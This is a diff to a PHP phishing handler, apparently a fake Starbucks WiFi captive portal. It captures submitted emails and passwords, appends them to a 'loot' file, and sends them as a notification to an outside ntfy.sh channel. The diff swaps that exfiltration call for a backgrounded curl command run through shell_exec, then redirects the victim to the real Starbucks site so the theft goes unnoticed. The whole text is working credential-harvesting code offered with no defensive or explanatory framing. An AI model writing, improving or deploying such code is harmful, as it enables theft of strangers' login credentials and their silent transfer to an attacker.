@@ -10,11 +10,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     @mkdir(dirname($loot_file), 0755, true);
     $entry = "[$timestamp] STARBUCKS | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
     file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
-    $ntfy_url = 'https://ntfy.sh/pineapple_loot';
+    
+    // NTFY via curl (more reliable than file_get_contents)
     $msg = "☕ STARBUCKS CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
-    @file_get_contents($ntfy_url, false, stream_context_create([
-        'http' => ['method' => 'POST', 'header' => "Content-Type: text/plain\r\n", 'content' => $msg]
-    ]));
+    $cmd = "curl -s -d " . escapeshellarg($msg) . " https://ntfy.sh/pineapple_loot >/dev/null 2>&1 &";
+    shell_exec($cmd);
+    
     header('Location: https://www.starbucks.com/');
     exit;
 }
